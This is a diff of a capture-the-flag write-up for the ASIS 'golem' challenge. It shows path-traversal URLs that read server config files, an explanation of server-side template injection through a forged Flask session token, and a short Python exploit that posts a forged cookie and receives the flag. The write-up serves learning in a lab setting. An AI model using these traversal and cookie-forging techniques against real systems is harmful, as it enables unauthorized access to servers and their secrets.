@@ -14,7 +14,7 @@ Trying leak other files gave us important infos : https://golem.asisctf.com/arti
 https://golem.asisctf.com/article?name=../../../../../../etc/uwsgi/apps-enabled/golem_proj.ini was showing main script path file <br>
 
 leaking that we can see that all parameters are kind of sanitized except token, which was then printed , looks like server side template injection<br>
-All I had to do is create local flask app, forge my token with payload, and send it to the application<br><br>
+All I had to do is create local flask app, forge my token using the key which was in the python file with payload, and send it to the application<br><br>
 
 Payload : <br>
 ```
@@ -35,16 +35,13 @@ if __name__ == '__main__':
 <br>
 and the exploit : <br>
 
-```
-import requests
+```import requests
 
 cookies={'session':'.eJwlyU0LgjAYAOC_Eu-5w9SCNugUOJl6iGgub21-QG4Z6Aab-N8zuj7PAv2oWwNkgZ0EAm0y9cwrKyL8kjQNKsJdoXEnBXObyVKj34WmYv-PeRDRacz5hMoUjcxjp7Kr29w3hvt7ptGTYlvEjZOUz0VcT49KWZUN7_x29HWVDvll6DuBzrDuYTYfIIdk_QL3ADJC.DJSUXQ.0_cgqMpbS89-sLEX2HaJRslq73I'}
 
 
 r=requests.post('https://golem.asisctf.com/golem',cookies=cookies)
 
-print r.text
-
-```
+print r.text```
 <br>
 Response contained flag : ASIS{I_L0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}
